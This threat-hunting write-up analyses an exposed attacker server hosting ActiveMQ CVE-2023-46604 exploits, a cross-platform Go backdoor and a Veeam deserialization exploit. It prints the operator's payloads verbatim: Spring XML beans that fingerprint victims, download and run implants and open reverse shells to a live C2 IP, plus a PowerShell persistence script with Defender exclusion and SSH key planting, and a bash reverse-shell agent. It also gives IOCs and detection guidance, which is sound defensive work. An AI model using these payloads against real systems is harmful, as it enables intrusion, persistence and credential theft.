---
title: "VIETJACK: Exposing an ActiveMQ Exploitation Toolkit with Cross-Platform Go Backdoor"
date: 2026-10-19
tags: [Threat Hunting, C2, ActiveMQ, Go Backdoor, CVE-2023-46604]
featuredImage: /images/vietjack-activemq-toolkit/banner.png
---

## Executive Summary

I found an open directory at `45.115.26.23:8012` that the operator never bothered to lock down. Inside was everything: Apache ActiveMQ exploit payloads (CVE-2023-46604), a Veeam Backup deserialization exploit, a custom Go backdoor compiled for over 10 architectures, persistence scripts for both Windows and Linux, and stolen credentials dumped from six victim hosts. The whole operation, just sitting there for anyone to browse.

The server belongs to "Internet Security Services VN" and is hosted in the Netherlands, though the naming conventions and ASN point to a Vietnamese operator.

I reported all confirmed malicious URLs and samples to abuse.ch (URLhaus + MalwareBazaar). The victim credential files were documented as evidence but never downloaded or stored.

---

## The Attacker's Infrastructure

### Host Profile

| Attribute | Value |
|---|---|
| **IP** | `45.115.26.23` |
| **ASN/Org** | Internet Security Services VN |
| **Country** | Netherlands (hosting) |
| **Open Ports** | 443 (HTTPS/C2), 8012 (HTTP/staging), 4455 (beacon), 4457 (shell) |
| **Role** | C2 server, payload staging, credential exfiltration |

The ASN name alone ("Internet Security Services **VN**") points to a Vietnamese operator renting Dutch infrastructure for their C2.

### Port Layout

The server uses four ports, each with a distinct role:

- **Port 443** is an HTTPS listener. It returns nothing notable on a direct visit, which is typical for a C2 command channel that only responds to the right implant handshake.
- **Port 8012** is the HTTP open directory. The attacker's entire toolkit, browsable by anyone.
- **Port 4455** is the PowerShell reverse shell beacon target, hardcoded in `persist.ps1`.
- **Port 4457** is the Bash agent beacon target, hardcoded in `bagent.sh` and all three AMQ exploit payloads.

---

## The Toolkit: What Was Exposed

### 1. Apache ActiveMQ Exploitation (CVE-2023-46604)

Three Spring Bean XML payloads sat in the open directory. For context: **CVE-2023-46604** is a critical (CVSS 10.0) deserialization vulnerability in Apache ActiveMQ. The attacker sends a crafted OpenWire protocol message that tells ActiveMQ to fetch and execute an attacker-hosted Spring Bean XML file. Simple, devastating, and still being exploited three years after disclosure.

#### poc_amq.xml: Reconnaissance and Multi-Method Reverse Shell

The first payload is the lightweight recon/access version. One bean, multiple fallback methods:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>sh</value>
                <value>-c</value>
                <value>(wget -q -T 10 -O /dev/null
                  "http://45.115.26.23:8012/x$(id -u;echo -;uname -m;echo -;
                  hostname;echo -;grep -c processor /proc/cpuinfo;echo -;
                  cat /etc/os-release 2>/dev/null|head -1|cut -d= -f2)")
                  2>/dev/null;
                (curl -s -m 10 -o /dev/null
                  "http://45.115.26.23:8012/x$(id -u;echo -;uname -m;echo -;
                  hostname;echo -;grep -c processor /proc/cpuinfo)")
                  2>/dev/null;
                (sh -i >& /dev/tcp/45.115.26.23/4457 0>&1) 2>/dev/null;
                (python3 -c '...reverse shell...') 2>/dev/null;
                (python -c '...reverse shell...') 2>/dev/null;
                (nc 45.115.26.23 4457 -e /bin/sh) 2>/dev/null</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

Two things stand out here. First, the **fingerprinting callback**: before doing anything else, it phones home with the victim's UID, architecture, hostname, CPU count, and OS release encoded right into the URL path (something like `/x0-x86_64-webserver01-4-Ubuntu`). This shows up in the attacker's HTTP access log, giving them a quick overview of what just got popped.

Second, the **five fallback reverse shells** in sequence: bash `/dev/tcp`, Python 3 socket, Python 2 socket, and netcat. All connecting back to port 4457. If one technique is not available on the target, the next one fires. Belt and suspenders.

#### poc_amq2.xml: The Complete Kill Chain

The second payload is the mature, operational version. Four separate beans running in parallel, covering recon, implant deployment, interactive access, and Windows targets all in a single XML:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd">

    <!-- Bean b1: Recon callback with variant tag -->
    <bean id="b1" class="java.lang.ProcessBuilder" init-method="start">
      <constructor-arg><list>
        <value>sh</value><value>-c</value>
        <value>(wget -q -T8 -O/dev/null
          "http://45.115.26.23:8012/amq2b_$(id -u)_$(uname -m)_$(hostname)_
          $(grep -c processor /proc/cpuinfo)") 2>/dev/null;
        (curl -s -m8 -o/dev/null
          "http://45.115.26.23:8012/amq2c_$(id -u)_$(uname -m)_$(hostname)")
          2>/dev/null</value>
      </list></constructor-arg>
    </bean>

    <!-- Bean b2: Download and deploy Go implant (arch-aware) -->
    <bean id="b2" class="java.lang.ProcessBuilder" init-method="start">
      <constructor-arg><list>
        <value>sh</value><value>-c</value>
        <value>u=$(uname -m);
          b=wsvc_linux_v2;
          if [ "$u" = "i686" ]; then b=wsvc_linux386_v2; fi;
          (wget -q -T10 -O/tmp/.w2 http://45.115.26.23:8012/$b
            && chmod +x /tmp/.w2
            && (setsid /tmp/.w2 >/dev/null 2>&1 &)) 2>/dev/null;
          (curl -s -m10 -o/tmp/.w2 http://45.115.26.23:8012/$b
            && chmod +x /tmp/.w2
            && (setsid /tmp/.w2 >/dev/null 2>&1 &)) 2>/dev/null;
          (busybox wget -q -T10 -O/tmp/.w2 http://45.115.26.23:8012/$b
            && chmod +x /tmp/.w2
            && (setsid /tmp/.w2 >/dev/null 2>&1 &)) 2>/dev/null</value>
      </list></constructor-arg>
    </bean>

    <!-- Bean b3: Immediate interactive reverse shells -->
    <bean id="b3" class="java.lang.ProcessBuilder" init-method="start">
      <constructor-arg><list>
        <value>sh</value><value>-c</value>
        <value>(bash -c 'bash -i >& /dev/tcp/45.115.26.23/4457 0>&1'
          >/dev/null 2>&1 &) 2>/dev/null;
        (python3 -c 'import socket,subprocess,os;
          s=socket.socket();s.connect(("45.115.26.23",4457));
          os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
          os.dup2(s.fileno(),2);
          subprocess.call(["/bin/sh","-i"])'
          >/dev/null 2>&1 &) 2>/dev/null</value>
      </list></constructor-arg>
    </bean>

    <!-- Bean b4: Windows variant via certutil -->
    <bean id="b4" class="java.lang.ProcessBuilder" init-method="start">
      <constructor-arg><list>
        <value>cmd</value><value>/c</value>
        <value>cmd /c "certutil -urlcache -split -f
          http://45.115.26.23:8012/wsvc_win_v2.exe
          C:\Windows\Temp\wsvc2.exe
          && start /b C:\Windows\Temp\wsvc2.exe"</value>
      </list></constructor-arg>
    </bean>
</beans>
```

Walking through each bean:

- **b1** is the recon callback, same idea as poc_amq.xml but this time tagged with `amq2b_`/`amq2c_` prefixes so the operator can tell which payload variant hit when reviewing the access log.
- **b2** is the implant deployment. It checks the architecture, picks `wsvc_linux_v2` or `wsvc_linux386_v2` accordingly, downloads it as `/tmp/.w2` (dot-prefixed to stay hidden from casual `ls`), and runs it detached. Three download fallbacks: wget, curl, busybox wget.
- **b3** opens interactive reverse shells to port 4457, giving the operator immediate hands-on access while the implant spins up in the background.
- **b4** handles Windows targets. It uses `certutil` to download `wsvc_win_v2.exe` into `C:\Windows\Temp\` and starts it.

One XML file handles Linux and Windows, deploys the persistent implant, and gives the operator a shell. Pretty well-engineered for what it is.

#### poc_amq3.xml: The Third Variant

Very similar to poc_amq2.xml, with a few tweaks. The implant saves as `/tmp/.w3` instead of `/tmp/.w2`, uses `chmod 777` instead of `chmod +x`, and the recon prefix is `amq3b_`/`amq3c_`. Small operational differences that suggest the operator runs different variants against different target sets and tracks which one landed.

### 2. Custom Cross-Platform Go Backdoor ("wsvc")

The core of the toolkit is a custom Go-compiled backdoor. What made my eyes widen was the sheer number of compiled variants sitting in the directory:

| Variant | Platform | Architecture |
|---|---|---|
| `wsvc.exe` | Windows | x64 |
| `wsvc_old.exe` | Windows | x64 (older build) |
| `wsvc_win_v2.exe` | Windows | x64 (v2) |
| `wsvc_linux` | Linux | x64 |
| `wsvc_linux_386` | Linux | x86 |
| `wsvc_linux_v2` | Linux | x64 (v2) |
| `wsvc_linux386_v2` | Linux | x86 (v2) |
| `wsvc_arm5_v2` | Linux | ARMv5 |
| `wsvc_arm64_v2` | Linux | ARM64 |
| `wsvc_mips_v2` | Linux | MIPS |
| `wsvc_mipsle_v2` | Linux | MIPS LE |
| `wsvc_ppc64_v2` | Linux | PPC64 |
| `wsvc_ppc64le_v2` | Linux | PPC64 LE |
| `wsvc_nobeacon_386` | Linux | x86 (no beacon) |

The naming convention tells a story. You can see `v2` and `_old` versions, meaning iterative development. There is a `_nobeacon` variant, which suggests a modular design where the beacon component can be compiled in or out depending on the situation. And the architecture coverage (ARM, MIPS, PPC) means this operator is not just going after Windows desktops. They are targeting **IoT devices, embedded systems, and enterprise Linux servers** across the board.

**YARA analysis** flagged the Windows variants with:
- `Suspicious_Golang_Binary` (confirmed Go compilation)
- `TH_AntiVM_MassHunt_Win_Malware_2026_CYFARE` (anti-VM evasion techniques baked in)
- `Disable_Defender` (via the persistence script that deploys it)

On Windows, the implant installs itself as a service named **"Windows Service Controller"** (`wsvc`) with automatic startup. Generic enough that most admins would scroll right past it.

### 3. Persistence Mechanisms

#### persist.ps1: Windows Persistence

The persistence script runs a complete post-exploitation sequence. Here are the key parts.

**Step 1: SSH key implant.** The very first thing it does is plant an ed25519 public key into the administrators' authorized_keys:

```powershell
$key='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINXERAciMEWq3c3EUn/ThtV3httVyRK72UNcxy9YFpNy node6-sm'
New-Item -ItemType Directory -Path C:\ProgramData\ssh -Force | Out-Null
Add-Content -Path C:\ProgramData\ssh\administrators_authorized_keys -Value $key -Force
```

This gives the operator persistent SSH access that survives password changes. The key comment `node6-sm` looks like an internal node identifier from the operator's infrastructure.

**Step 2: Implant deployment.** It picks the right binary based on the OS version, downloads via certutil, adds a Defender exclusion, and installs it as a service:

```powershell
$osv = (Get-WmiObject Win32_OperatingSystem).Version
$exe = 'wsvc_old.exe'
if([int]$osv.Split('.')[0] -ge 10){ $exe = 'wsvc.exe' }

cmd /c ("certutil -urlcache -split -f http://45.115.26.23:8012/"+$exe+
        " C:\Windows\Temp\wsvc.exe")
Add-MpPreference -ExclusionPath 'C:\Windows\Temp\wsvc.exe'

sc.exe create wsvc binPath= '"C:\Windows\Temp\wsvc.exe"' start= auto `
  DisplayName= 'Windows Service Controller'
sc.exe start wsvc
```

**Step 3: Scheduled task beacon.** Creates a task named "WinUpdCheck" running every 5 minutes as SYSTEM, with a base64-encoded reverse shell connecting back to port 4455:

```powershell
schtasks /create /tn "WinUpdCheck" /tr "powershell -ep bypass -w hidden -enc $enc" `
  /sc minute /mo 5 /ru SYSTEM /f
```

**Step 4: SSH server installation.** Installs OpenSSH, deploys a custom sshd_config, and opens port 22 through the firewall:

```powershell
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Set-Service sshd -StartupType Automatic
Start-Service sshd
netsh advfirewall firewall add rule name="sshd" dir=in action=allow `
  protocol=TCP localport=22
```

The script catches and continues past errors at every step, tries multiple fallback methods, and reports its status back as a pipe-delimited string: `AGENT_OK|BEACON_OK|SSH_OK`. It is designed to not fail silently but also not stop on any single failure.

#### sshd_config.txt: Custom SSH Configuration

The operator deploys their own SSH config to the victim:

```
# sshd_config for Win32-OpenSSH (node6 fix)
Port 22
ListenAddress 0.0.0.0
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
AuthorizedKeysFile .ssh/authorized_keys
Subsystem	sftp	sftp-server.exe
Match Group administrators
       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
```

Notice the comment: "node6 fix". Combined with the `node6-sm` SSH key comment, this confirms the operator labels their infrastructure with node IDs. Also notice they keep `PasswordAuthentication yes` alongside pubkey auth, meaning they can use either stolen passwords or their planted key to get back in.

#### bagent.sh: Linux Persistence

The Linux side is simpler. A bash agent that opens a persistent TCP connection to port 4457, identifies itself with the `BASHAGENT` protocol tag, sends the UID and architecture, and then loops forever reading commands and sending back output:

```bash
#!/bin/bash
H=45.115.26.23
P=4457
while true; do
  {
    exec 5<>/dev/tcp/$H/$P || sleep 20
    echo "BASHAGENT $(id -u 2>/dev/null) $(uname -m 2>/dev/null)" >&5
    while IFS= read -r line <&5; do
      [ -z "$line" ] && continue
      [ "$line" = "exit" ] && break
      out=$(eval "$line" 2>&1 | head -c 60000)
      printf '%s\nEOB_END\n' "$out" >&5
    done
  } 2>/dev/null
  exec 5<&- 2>/dev/null
  exec 5>&- 2>/dev/null
  sleep 15
done
```

It reconnects automatically every 15 seconds if the connection drops. The `EOB_END` marker after each command output tells the operator's listener where one result ends and the next begins. Simple but reliable.

### 4. Veeam Backup Deserialization Exploit

This was an interesting find. `deser.cs` is not a generic deserialization test. It specifically targets **Veeam Backup and Replication**:

```csharp
using System;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;

class DeserTest
{
    static void Main(string[] args)
    {
        AppDomain.CurrentDomain.AssemblyResolve += (s, e) => {
            var an = new AssemblyName(e.Name).Name;
            var p = Path.Combine(
                AppDomain.CurrentDomain.BaseDirectory, an + ".dll");
            if (File.Exists(p)) {
                Console.WriteLine("resolve: " + p);
                return Assembly.LoadFrom(p);
            }
            p = Path.Combine(
                @"C:\Program Files\Veeam\Backup and Replication\Backup",
                an + ".dll");
            if (File.Exists(p)) {
                Console.WriteLine("resolve: " + p);
                return Assembly.LoadFrom(p);
            }
            Console.WriteLine("resolve FAIL: " + e.Name);
            return null;
        };
        try
        {
            var m = Assembly.LoadFrom(
                @"C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Model.dll");
            Console.WriteLine("installed asm ver: " + m.GetName().Version.ToString());
            var bytes = File.ReadAllBytes("payload.raw");
            Console.WriteLine("len=" + bytes.Length);
            var bf = new BinaryFormatter();
            var o = bf.Deserialize(new MemoryStream(bytes));
            Console.WriteLine("DESER OK: " + (o == null ? "null" : o.GetType().FullName));
        }
        catch (Exception e)
        {
            Console.WriteLine("EX: " + e.GetType().FullName + ": " + e.Message);
            var ie = e.InnerException;
            while (ie != null) {
                Console.WriteLine("INNER: " + ie.GetType().FullName + ": " + ie.Message);
                ie = ie.InnerException;
            }
        }
    }
}
```

The code loads `Veeam.Backup.Model.dll` directly from the Veeam installation path, then feeds `payload.raw` (the serialized .NET object sitting alongside it in the open directory) through `BinaryFormatter.Deserialize`. This is a classic .NET deserialization RCE targeting Veeam backup servers.

The `ysosrc.tgz` archive sitting next to it contained ysoserial source code (a Java deserialization exploit framework), rounding out the picture: this operator has tooling to target ActiveMQ (Java), Veeam (C#/.NET), and potentially any other Java or .NET app with deserialization issues.

So we are not looking at a single-vulnerability opportunist. This is someone with **two separate exploit chains** ready to go: ActiveMQ for initial access, and Veeam for high-value targets where backup servers are reachable.

### 5. Stolen Victim Credentials

The open directory also contained credential dump files from six compromised hosts, following the naming pattern `creds_VICTIM_IP.txt`. File sizes ranged from 1.6 KB to 34 KB, indicating varying depths of credential extraction across targets. The victims spanned multiple cloud providers and ISPs across different regions.

These files were documented as evidence only and never downloaded or redistributed. Their existence and context were reported to relevant CERT and abuse contacts for victim notification.

---

## Attack Flow Reconstruction

Putting all the pieces together, the full attack chain looks like this:

```
1. SCANNING
   Operator scans for exposed ActiveMQ instances (port 61616/8161)

2. EXPLOITATION (CVE-2023-46604)
   Sends OpenWire ClassPathXmlApplicationContext pointing to poc_amq2.xml
      Bean b1: Fingerprint callback (logs victim metadata)
      Bean b2: Downloads arch-appropriate wsvc implant to /tmp/.w2
      Bean b3: Opens immediate reverse shell on :4457
      Bean b4: (Windows) Downloads wsvc_win_v2.exe via certutil

3. PERSISTENCE
   [Windows] persist.ps1:
      Plants SSH key (node6-sm)
      Installs wsvc as "Windows Service Controller" service
      Creates "WinUpdCheck" scheduled task (beacon every 5 min)
      Adds Defender exclusion
      Installs/configures OpenSSH server
   [Linux] bagent.sh:
      Persistent bash reverse shell with auto-reconnect

4. CREDENTIAL THEFT
   Dumps credentials, uploads to staging server as creds_VICTIM_IP.txt

5. LATERAL MOVEMENT / SECONDARY EXPLOITATION
   Uses stolen creds + SSH access for further compromise
   Veeam deserialization exploit (deser.cs + payload.raw) for backup servers
```

Everything from exploitation through persistence is automated. The only manual step the operator has is reviewing the access log and deciding which victims to prioritize.

---

## Indicators of Compromise

### Network

| IOC | Type | Context |
|---|---|---|
| `45.115.26.23` | IP | C2 server, payload staging, credential exfil |
| `45.115.26.23:443` | IP:port | HTTPS C2 listener |
| `45.115.26.23:8012` | IP:port | HTTP payload staging (open directory) |
| `45.115.26.23:4455` | IP:port | PowerShell reverse shell beacon |
| `45.115.26.23:4457` | IP:port | Bash reverse shell beacon |

### File Hashes (SHA-256)

| Sample | SHA-256 |
|---|---|
| wsvc_old.exe (Windows) | `d7f29e5c786869bde4bbf88911f7302d89d90a7249e0406c6f825889dcd8b1d4` |
| persist.ps1 | `1ff457d643e5246efb04861169153402345d50b0bb296443b93a87790909efd5` |
| bagent.sh | `10f93f1c1f5297099f598e5c33fc6c9e3e5360f3e83e05bb972c13ef80b31961` |
| poc_amq.xml | `88b3d3e6dc7e32f8d9805eb4b16cd826ec9e068e911a204e0ec3a2d44479ffd7` |
| poc_amq2.xml | `1daf17b715f8d3d2c1620008bc70ad21b108af227661d3f02d7a3ee8545816b4` |
| poc_amq3.xml | `09a4a01dba9403ff8bb34b788247b916d996113a34847115d45dbf006299f336` |
| deser.cs | `4ed56d00cff8cd8d70fde919621225408528429720a38692971176a039168357` |
| payload.raw | `58613b9c39e26b344e80ccf335230e27f1c79625634699c6b70e647d735a81f4` |
| wsvc_linux (ELF x64) | `5b45d5bf4d4598a14c0ea173f7bf29d08fcb96fd1d7c01218f32e06d46ee6ca4` |
| wsvc_linux_arm (ELF arm64) | `6564e1942dedf8c67ec0e7f9959d918b6d63ba0c9d37c185e30b375f1759c88c` |

### Host Indicators

- Windows service name: `wsvc` (display name "Windows Service Controller")
- Scheduled task: `WinUpdCheck` (every 5 minutes, SYSTEM)
- SSH key comment: `node6-sm`
- Dropped files: `C:\Windows\Temp\wsvc.exe`, `C:\Windows\Temp\wsvc2.exe`
- Linux hidden implant: `/tmp/.w2`, `/tmp/.w3`
- Custom sshd_config deployed to `C:\ProgramData\ssh\sshd_config`

### YARA Rules That Matched

- `Suspicious_Golang_Binary`
- `TH_AntiVM_MassHunt_Win_Malware_2026_CYFARE`
- `Disable_Defender`
- `Sus_CMD_Powershell_Usage`

---

## Detection Guidance

If you are defending a network and want to hunt for this threat:

- Look for `certutil -urlcache -split -f` downloading executables to `C:\Windows\Temp\`
- Alert on new services named `wsvc` or with display name "Windows Service Controller"
- Watch for scheduled tasks named `WinUpdCheck` running encoded PowerShell
- Detect SSH key additions to `C:\ProgramData\ssh\administrators_authorized_keys`
- Monitor outbound connections to ports 4455 and 4457
- Audit your ActiveMQ instances for CVE-2023-46604 patching status. Seriously. It has been three years.
- Audit Veeam Backup servers for .NET deserialization exposure
- On Linux, hunt for `/tmp/.w2`, `/tmp/.w3`, or unexpected Go binaries sitting in `/tmp/`
